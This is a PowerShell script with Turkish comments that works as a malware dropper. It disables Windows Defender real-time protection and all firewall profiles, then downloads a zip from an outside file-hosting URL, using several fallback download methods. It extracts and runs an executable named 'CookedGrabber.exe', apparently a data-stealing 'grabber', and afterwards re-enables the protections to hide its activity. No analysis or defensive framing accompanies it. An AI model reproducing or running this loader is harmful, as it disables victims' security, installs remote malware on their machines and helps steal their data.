# GERÇEK ZAMANLI KORUMAYI KAPAT
Set-MpPreference -DisableRealtimeMonitoring $true

# GÜVENLİK DUVARLARINI KAPAT
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# === AYARLAR ===
$zipUrl = "https://phs6.krakencloud.net/force-download/ZjdhMjJlNmIwMGM3YTQ0ZnUvbBzC6-Fq1H1QfOvKwtVYQ2m_AddficIHlUyr9JwO/t28HbdD6ca"
$zipPath = "$env:TEMP\bot.zip"
$extractPath = "$env:TEMP\karımicin"
$exeName = "CookedGrabber.exe"

# TEMİZLİK
Remove-Item $zipPath -ErrorAction SilentlyContinue
Remove-Item $extractPath -Recurse -Force -ErrorAction SilentlyContinue

# ZIP ÇIKARMA
function Try-ExtractZip {
    param ($path)
    try {
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $path)
        return $true
    } catch {
        return $false
    }
}

# DOSYAYI İNDİR
try {
    Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing
} catch {
    try {
        Start-BitsTransfer -Source $zipUrl -Destination $zipPath
    } catch {
        try {
            curl.exe -L $zipUrl -o $zipPath
        } catch {}
    }
}

# ÇIKAR VE ÇALIŞTIR
if (Test-Path $zipPath) {
    if (!(Test-Path $extractPath)) {
        New-Item -ItemType Directory -Path $extractPath | Out-Null
    }

    if (Try-ExtractZip $extractPath) {
        $exePath = Join-Path $extractPath $exeName
        if (Test-Path $exePath) {
            Start-Process -FilePath $exePath
        }
    }
}

# GERÇEK ZAMANLI KORUMAYI GERİ AÇ
Set-MpPreference -DisableRealtimeMonitoring $false

# GÜVENLİK DUVARLARINI GERİ AÇ
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
